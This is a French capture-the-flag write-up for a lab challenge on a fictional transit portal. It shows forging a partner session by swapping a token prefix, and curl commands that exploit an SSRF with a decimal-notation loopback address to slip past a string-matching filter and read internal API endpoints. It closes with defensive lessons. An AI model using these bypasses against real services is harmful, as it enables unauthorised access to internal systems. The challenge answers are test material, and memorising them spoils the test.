@@ -1,0 +1,150 @@
+Source locale : web/depart/writeup-THE-PASSENGER.md
+Copie documentaire expurgée ; les affirmations restent celles de la source.
+
+# THE PASSENGER — Northline Transit (q:3)
+
+## Objectif
+
+Retrouver l'identité sous laquelle **Thomas Crown** prépare son départ, à partir
+de l'espace partenaire Northline Transit et du service de coordination interne.
+
+## État initial
+
+- Cible : `http://172.28.38.2:8080`
+- Reçu de transport `recu_northline.png` contenant une référence `NL-24-7K42`
+  et un QR pointant vers `/track/TRK.<id>.<integrite>`.
+- Le portail partenaire n'accepte pas le préfixe `TRK` mais accepte le même
+  identifiant/intégrité avec le préfixe `PRT`.
+
+## Reconnaissance
+
+1. Décodage du QR du reçu :
+
+   ```bash
+   zbarimg --raw -q recu_northline.png
+   ```
+
+   Résultat : une URL `.../track/TRK.<id>.<integrite>`.
+
+2. Le préfixe `TRK` est refusé par `/login` (« invalide ou expiré »). En
+   remplaçant `TRK` par `PRT` — l'intégrité ne dépend que de l'identifiant —
+   on obtient une session partenaire valide :
+
+   ```bash
+   curl -i -X POST http://172.28.38.2:8080/login \
+        -d 'code=PRT.<id>.<integrite>'
+   # -> 302 vers /dashboard
+   ```
+
+3. Le tableau de bord révèle le compte **Skarvik Marine Services**
+   (`partner-1042`) et une carte contenant l'identifiant de session
+   (résolution de q:2).
+
+## Interprétation
+
+Le portail `/waybills` propose un champ `source_url` qui fait récupérer une URL
+par le serveur (SSRF). Les contraintes observées :
+
+- seuls les schémas `http` passent ;
+- seul le port `8081` est autorisé ;
+- les chaînes littérales `127.0.0.1` et `localhost` sont bloquées.
+
+Contournement : la notation décimale de l'adresse de bouclage
+`2130706433` équivaut à `127.0.0.1` mais ne correspond à aucun motif bloqué.
+
+```bash
+curl -s -X POST http://172.28.38.2:8080/waybills \
+     --cookie 'session=<...>' \
+     -d 'source_url=http://2130706433:8081/docs'
+```
+
+La réponse est un JSON échappé dans `<pre class="preview">`. La spec `/docs`
+expose notamment :
+
+- `/api/shipments/<reference>`
+- `/api/operations/<operation>`
+- `/api/operations/<operation>/assignments`
+- `/flag`
+
+## Exploitation
+
+La référence du reçu (`NL-24-7K42`) renvoie l'opération `OP-24-7319` :
+
+```bash
+curl -s -X POST http://172.28.38.2:8080/waybills \
+     --cookie 'session=<...>' \
+     -d 'source_url=http://2130706433:8081/api/shipments/NL-24-7K42'
+```
+
+Puis la fiche d'opération détaillée :
+
+```bash
+curl -s -X POST http://172.28.38.2:8080/waybills \
+     --cookie 'session=<...>' \
+     -d 'source_url=http://2130706433:8081/api/operations/OP-24-7319'
+```
+
+Structure retournée (valeur de couverture volontairement masquée) :
+
+```json
+{
+  "classification": "Coordination confidentielle",
+  "destination": {
+    "final_destination": "Îles d'Aster",
+    "location": "Terminal maritime de Skarvik",
+    "meeting_point": "Hangar C4 — quai de service nord"
+  },
+  "operation_id": "OP-24-7319",
+  "shipment_reference": "NL-24-7K42",
+  "traveller": {
+    "cover_name": "<couverture — réponse soumise>",
+    "identity": "Thomas Crown",
+    "traveller_id": "PAX-2048"
+  }
+}
+```
+
+Le champ `traveller.cover_name` est l'identité de couverture demandée par
+l'énoncé. Les 24 autres opérations (`OP-24-1001` à `OP-24-1024`) sont des
+expéditions standard sans objet `traveller`, ce qui confirme que
+`OP-24-7319` est l'opération d'exfiltration.
+
+## Chemins qui ont échoué
+
+- **Préfixe `TRK` en login** : rejeté, le portail partenaire attend `PRT`.
+  L'intégrité étant calculée sur l'identifiant seul, la substitution suffit.
+- **`http://127.0.0.1:8081/...` et `http://localhost:8081/...`** : bloqués par
+  le filtre anti-loopback.
+- **Autres ports** (80, 8000, 8082…) : refusés par la validation de port.
+- **Énumération des 25 expéditions `NL-24-41xx`** : aucune ne contient de
+  voyageur ; seule la référence du reçu mène à `OP-24-7319`.
+
+## Validation reproductible (sans la réponse)
+
+```bash
+python3 solveur.py --target http://172.28.38.2:8080 \
+  --code PRT.<id>.<integrite> --q3
+```
+
+Le script doit afficher :
+
+```
+[+] session partenaire : Skarvik Marine Services
+[+] opération   : OP-24-7319
+[+] expédition  : NL-24-7K42
+[+] identité    : Thomas Crown (PAX-2048)
+[+] destination : Îles d'Aster
+[+] FLAG q:3    : <couverture>
+```
+
+Un coéquipier peut vérifier l'exactitude en comparant `traveller.cover_name` à
+la valeur attendue par la plateforme, sans que cette valeur n'apparaisse ici.
+
+## Leçons
+
+- Une intégrité qui ne lie que l'identifiant et pas le préfixe permet de
+  changer de contexte (suivi public → espace partenaire).
+- Les filtres anti-SSRF par correspondance de chaînes se contournent avec des
+  représentations alternatives de l'adresse (décimale, IPv6 mappée).
+- La documentation interne exposée (`/docs`) transforme une SSRF aveugle en
+  énumération d'API complète.
